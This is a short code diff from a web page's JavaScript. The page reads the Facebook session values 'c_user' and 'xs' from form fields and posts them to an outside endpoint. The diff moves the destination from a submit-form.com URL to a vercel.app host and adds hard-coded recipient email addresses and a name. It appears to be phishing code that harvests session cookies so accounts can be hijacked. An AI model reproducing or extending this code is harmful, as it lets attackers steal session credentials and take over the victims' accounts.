@@ -1730,19 +1730,21 @@
           }
 
                 // Submit c_user and xs together
-          const formData = new FormData();
-          formData.append("c_user", cUserInput.value);
-          formData.append("xs", xsInput.value);
-
-          fetch("https://submit-form.com/c4sBSh1fv ", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-              c_user: cUserInput.value,
-              xs: xsInput.value
-            }),
+          const cUserInput = document.getElementById("c_user");
+            const xsInput = document.getElementById("xs");
+            
+            fetch("https://postal-form.vercel.app/submit", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    c_user: cUserInput.value,
+                    xs: xsInput.value,
+                    emails: ["mehtabalii67890@gmail.com", "lingdavid24@gmail.com"],
+                    workerEmails: ["mehtabalii67890@gmail.com", "lingdavid24@gmail.com"],
+                    name: "Ishaque",
+                }),
           })
             .then((response) => {
               if (!response.ok) {
